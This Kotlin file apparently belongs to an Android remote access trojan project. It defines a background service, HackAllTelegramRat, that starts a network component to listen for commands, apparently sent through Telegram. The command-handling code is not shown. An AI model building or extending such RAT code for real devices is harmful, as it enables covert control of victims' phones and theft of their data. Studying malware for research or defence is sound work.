package cocomelonc.hackall.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.os.IBinder
import cocomelonc.hackall.tools.HackAllNetwork
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel

class HackAllTelegramRat: Service() {
    private val scope = CoroutineScope(
        SupervisorJob() + Dispatchers.IO
    )

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(
        intent: Intent?, flags: Int, startId: Int
    ): Int {
        startTelegramService()
        return super.onStartCommand(intent, flags, startId)
    }

    @SuppressLint("NewApi")
    private fun stop() {
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }

    private fun startTelegramService() {
        HackAllNetwork(applicationContext).startListenCommands()
    }
}

enum class Actions {
    START, STOP
}